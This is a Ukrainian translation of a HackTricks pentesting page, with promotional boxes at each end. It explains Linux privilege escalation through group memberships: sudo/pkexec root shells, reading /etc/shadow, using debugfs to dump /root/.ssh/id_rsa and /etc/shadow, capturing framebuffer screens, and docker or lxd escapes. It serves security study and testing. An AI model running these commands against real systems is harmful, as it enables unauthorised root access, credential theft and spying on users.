<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>


# Групи Sudo/Admin

## **PE - Метод 1**

**Іноді**, **за замовчуванням \(або через необхідність деякого програмного забезпечення\)** всередині файлу **/etc/sudoers** ви можете знайти деякі з цих рядків:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконати будь-яку дію як sudo**.

Якщо це так, для **отримання прав root ви можете просто виконати**:
```text
sudo su
```
## Підвищення привілеїв - Метод 2

Знайдіть всі suid-бінарники та перевірте, чи є серед них бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявите, що бінарний файл pkexec є SUID-бінарним і ви належите до групи sudo або admin, ви, ймовірно, зможете виконувати бінарні файли як sudo, використовуючи pkexec.
Перевірте вміст:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Тут ви знайдете, які групи мають дозвіл на виконання **pkexec** і **за замовчуванням** в деяких дистрибутивах Linux можуть **з'явитися** деякі з груп **sudo або admin**.

Для **отримання прав root ви можете виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви намагаєтеся виконати **pkexec** і отримуєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не через відсутність дозволів, а через відсутність підключення без GUI**. Існує обхідне рішення для цієї проблеми тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні сесії ssh**:

{% code title="сесія1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="сесія2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Група Wheel

Іноді, за замовчуванням у файлі **/etc/sudoers** ви можете знайти цей рядок:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконати будь-що як sudo**.

Якщо це так, **щоб стати root, ви можете просто виконати**:
```text
sudo su
```
# Група Shadow

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Так, прочитайте файл і спробуйте **розшифрувати деякі хеші**.

# Група диска

Ця привілея майже **еквівалентна доступу до root**, оскільки ви можете отримати доступ до всіх даних всередині машини.

Файли: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зверніть увагу, що за допомогою debugfs ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` в `/tmp/asd2.txt`, ви можете виконати:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо ви спробуєте **записати файли, що належать root** \(наприклад, `/etc/shadow` або `/etc/passwd`\), ви отримаєте помилку "**Permission denied**".

# Група відео

Використовуючи команду `w`, ви можете знайти **хто увійшов в систему** і отримаєте вивід, схожий на наступний:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi залогінений фізично** до терміналу на машині.

Група **video** має доступ до перегляду виводу екрану. В основному, ви можете спостерігати за екранами. Для цього потрібно **захопити поточне зображення на екрані** у вигляді сирої даних та отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Для **відкриття** **сирого зображення** ви можете використовувати **GIMP**, виберіть файл **`screen.raw`** та виберіть тип файлу **Raw image data**:

![](../../.gitbook/assets/image%20%28208%29.png)

Потім змініть ширину та висоту на використані на екрані та перевірте різні типи зображень \(і виберіть той, який краще показує екран\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Група Root

Здається, за замовчуванням **члени групи root** можуть мати доступ до **зміни** деяких файлів конфігурації **служб** або деяких файлів **бібліотек** або **інших цікавих речей**, які можуть бути використані для підвищення привілеїв...

**Перевірте, які файли можуть змінювати члени групи root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Група Docker

Ви можете підключити кореневу файлову систему хост-машини до тома екземпляра, тому коли екземпляр запускається, він негайно завантажує `chroot` в цей том. Це фактично дає вам root-доступ до машини.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Група lxc/lxd

[lxc - Підвищення привілеїв](lxd-privilege-escalation.md)



<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF-форматі**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
